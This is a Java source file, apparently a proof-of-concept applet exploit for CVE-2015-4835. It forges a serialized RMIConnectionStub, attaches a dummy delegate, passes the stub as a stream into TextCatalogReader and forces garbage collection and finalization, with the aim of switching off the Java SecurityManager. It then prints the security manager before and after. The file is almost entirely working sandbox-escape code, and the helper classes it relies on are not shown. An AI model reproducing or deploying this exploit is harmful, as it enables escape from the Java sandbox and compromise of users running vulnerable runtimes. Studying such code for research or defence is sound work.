package poc.cve_2015_4835;

import java.applet.Applet;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.ObjectStreamConstants;
import java.nio.channels.Channels;

public class Main extends Applet {

	private static final long serialVersionUID = -4730062442248867420L;
	
	public static Applet INSTANCE;
	
	public static volatile Throwable ERROR = null;
	public static volatile boolean COMPLETED = false;
	
	public static void unimplemented( ) {
		new Throwable( ).printStackTrace();
		throw new AssertionError( "Method not implemented." );
	}
	
	public static void log( String fmt, Object... args ) {
		StringBuilder sb = new StringBuilder( );
		sb.append( "\t- " );
		sb.append( String.format( fmt, args ) );
		
		System.err.println( sb );
	}
	
	private static RMIConnectionStub createStub( ) throws IOException, ClassNotFoundException {
		ByteArrayOutputStream byteOut = new ByteArrayOutputStream( );
		ObjectOutputStream objOut = new ObjectOutputStream( byteOut );
		
		byteOut.write( ObjectStreamConstants.TC_OBJECT );
		objOut.writeObject( ObjectStreamClass.lookup( RMIConnectionStub.class ) );
		objOut.writeInt( 0 );
		objOut.writeInt( 0 );
		objOut.flush( );
		byteOut.write( ObjectStreamConstants.TC_ENDBLOCKDATA );
		
		objOut.close( );
		
		
		ByteArrayInputStream byteIn = new ByteArrayInputStream( byteOut.toByteArray() );
		ObjectInputStream objIn = new ObjectInputStream( byteIn );
		
		return ( RMIConnectionStub ) objIn.readObject();
	}
	
	private void disableSecurity( ) {
		try {
			RMIConnectionStub stub = Main.createStub();
			stub._set_delegate( new DummyDelegate( ) );
			
			InputStream input = Channels.newInputStream( stub );
			
			new TextCatalogReader( input );
			
			System.gc();
			System.runFinalization();
			
			while( !Main.COMPLETED );
			
			if( Main.ERROR != null ) {
				throw Main.ERROR;
			}
		}
		catch( Throwable t ) {
			t.printStackTrace();
		}
	}
	
	@Override
	public void init( ) {
		Main.INSTANCE = this;
		
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
		this.disableSecurity();
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
	}
}
